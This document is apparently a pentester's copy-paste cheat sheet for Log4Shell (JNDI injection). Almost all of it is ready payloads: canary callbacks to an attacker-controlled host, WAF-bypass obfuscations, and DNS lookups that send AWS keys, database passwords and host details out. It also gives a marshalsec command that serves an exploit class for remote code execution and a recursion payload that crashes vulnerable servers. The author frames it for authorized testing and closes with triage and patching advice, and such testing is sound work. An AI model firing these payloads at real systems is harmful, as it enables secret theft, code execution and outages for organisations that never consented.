# JNDI Injection / Log4Shell — Attack Arsenal (copy-paste)

**Author:** x8bitranjit
Payloads, protocols, WAF-bypass obfuscation, and `${env}` exfil for the guide. **Authorized targets only.** The finding is an
**out-of-band callback from the target carrying YOUR unique token** — not a reflected `${jndi:}` (Guide §16). Replace
`OOB` with your interactsh/Collaborator host; keep a **per-input token** so callbacks self-label. One benign proof, then STOP.

---

## 0. The canary (fire this first, DNS-first)

```
${jndi:ldap://TOKEN.OOB/a}                 # classic
${jndi:dns://TOKEN.OOB/a}                   # detection + exfil; survives egress filtering; stealthiest
${jndi:rmi://TOKEN.OOB:1099/a}              # RMI alternative
${jndi:ldaps://TOKEN.OOB:1389/a}            # TLS LDAP (may bypass 389/1389 egress rules)
${jndi:iiop://TOKEN.OOB/a}                  # CORBA/IIOP (niche, old app servers)
# TOKEN = per-input label, e.g. ua-, xff-, user-, q- (so a callback tells you WHICH input is vulnerable).
```

---

## 1. Inject points (spray the canary into ALL of these)

```
HEADERS:  User-Agent  Referer  X-Forwarded-For  X-Api-Version  X-Forwarded-Host  X-Real-IP  True-Client-IP
          Authorization  Cookie  Origin  Accept-Language  Forwarded  X-Requested-With  Host  + every custom X-* header
PARAMS/BODY:  every query param · form field · JSON value AND key · login username/email (logged on failure) ·
              search term · uploaded filename · SOAP/XML field · GraphQL variable · webhook body
PATH/METHOD:  the request path (404s get logged) · an odd HTTP method
INDIRECT:     values stored then logged by a back-office worker · admin panels that log user data · error-logged inputs
```

---

## 2. WAF / filter bypass — nested-lookup obfuscation (Log4j resolves nested ${})

```
${${lower:j}ndi:ldap://TOKEN.OOB/a}
${${lower:jndi}:ldap://TOKEN.OOB/a}
${${upper:j}${upper:n}${upper:d}${upper:i}:ldap://TOKEN.OOB/a}
${${::-j}${::-n}${::-d}${::-i}:ldap://TOKEN.OOB/a}                 # ${::-X} => literal X
${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}ldap://TOKEN.OOB/a}
${${env:BARFOO:-j}ndi:${lower:l}${lower:d}a${lower:p}://TOKEN.OOB/a}   # rebuild both 'jndi' and 'ldap'
${${date:'j'}${date:'n'}${date:'d'}i:ldap://TOKEN.OOB/a}
${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://TOKEN.OOB/a}
${j${k8s:k5:-ND}i${sd:k5:-:}ldap://TOKEN.OOB/a}
# also: URL-encode the whole value; split across two headers the app concatenates; mix ldap/dns.
```

---

## 3. Secret / env-var exfiltration (data theft WITHOUT RCE — works on 2.15, Guide §11)

```
${jndi:ldap://${env:AWS_SECRET_ACCESS_KEY}.OOB/a}
${jndi:dns://${env:AWS_ACCESS_KEY_ID}.OOB/a}
${jndi:ldap://${env:DB_PASSWORD}.OOB/a}
${jndi:dns://${sys:user.name}.${env:HOSTNAME}.OOB/a}
${jndi:ldap://${sys:java.version}.${sys:os.name}.OOB/a}          # fingerprint the JVM/OS
${jndi:ldap://${env:KUBERNETES_SERVICE_HOST}.OOB/a}              # in-cluster?
${jndi:ldap://${k8s:...}.OOB/a}   ${jndi:ldap://${docker:...}.OOB/a}
# the resolved value becomes a DNS label sent to your OOB. base32/hex if it has DNS-invalid chars; split long values.
```

---

## 4. Version / reachability fingerprint via lookups

```
${jndi:dns://ver-${sys:java.version}.OOB/a}       # JDK version -> decides technique (pre/post Oct-2018, Guide §9)
${jndi:dns://os-${sys:os.name}.OOB/a}
# a non-empty, correct value returning to your OOB confirms lookups resolve (>=partial-vuln).
```

---

## 5. RCE delivery (AUTHORIZED engagements/labs only — use the established servers, Guide §10)

```
# technique A (remote codebase, old JVM trustURLCodebase=true):
marshalsec: java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://ATTACKER:8000/#Exploit" 1389
  + host Exploit.class on http://ATTACKER:8000/ ; payload -> ${jndi:ldap://ATTACKER:1389/Exploit}

# technique B (serialized gadget, bypasses trustURLCodebase) - see ../Deserialization/ for chains:
marshalsec LDAPRefServer + ysoserial CommonsCollections5/6 (or Spring) as javaSerializedData.

# technique C (BeanFactory/EL local bypass, modern JVM) - all-in-one servers auto-select:
JNDI-Injection-Exploit / rogue-jndi / JNDIExploit  -> serve A+B+C, print the ${jndi:...} to use.

# THIS KIT ships DETECTION only (poc/) - it does NOT deliver gadgets. One benign `id`, then STOP.
```

---

## 6. DoS (CVE-2021-45105 — authorize; Guide §12)

```
${${::-${::-$${::-:}}}}          # self-referential recursion -> StackOverflow on vulnerable 2.x < 2.17
# prove reproducibility with authorization; do NOT crash prod for real users.
```

---

## 7. Tools

| Tool | Use |
|------|-----|
| **interactsh / Burp Collaborator** | The OOB oracle — DNS + LDAP/RMI callbacks (the proof) |
| **`poc/jndi_probe.py`** | Spray `${jndi:}` (+ obfuscated) into headers/params/body with per-input tokens |
| **`poc/payload_gen.py`** | Generate the full payload matrix (protocols + WAF-bypass + `${env}` exfil) for your OOB |
| **`poc/callback_listener.py`** | Benign multi-port TCP connection logger — confirms the JVM called back, serves NO gadget |
| **log4j-scan** (fullhunt) | Canary sprayer with a bundled callback server (verify OOB by hand) |
| **nuclei** `-tags log4j,jndi` | Template sweep |
| **marshalsec + ysoserial** | RCE delivery (serialized gadget, technique B) — authorized only |
| **JNDI-Injection-Exploit / rogue-jndi / JNDIExploit** | All-in-one A/B/C exploit servers — authorized only |

---

## 8. Triage rules (don't waste a report)

```
target-sourced DNS/LDAP callback carrying YOUR token                → REPORT Critical (blind RCE), name the input + technique
callback + benign `id`/hostname via A/B/C (authorized)              → REPORT Critical (RCE proven)
dns:// callback + non-empty ${env:SECRET} label at your OOB         → REPORT High/Critical (secret exfil, works on 2.15)
JNDI lookup reaches internal host / metadata only                  → REPORT SSRF (Medium/High) -> ../SSRF/
reflected ${jndi:} in the response, NO callback                    → NOT a finding (reflection != evaluation)
scanner "log4j detected" / version banner, NO callback             → reproduce with YOUR OOB first
callback from a scanner/AV sandbox, not the app egress             → correlate token + source; re-fire, confirm app path
```

> OOB callback carrying your token = proof. Per-input tokens. One benign command or one leaked secret, then STOP.
> Tear down any exploit server. Recommend upgrade to Log4j 2.17.1+ / remove JndiLookup / egress-filter. Authorized targets only.
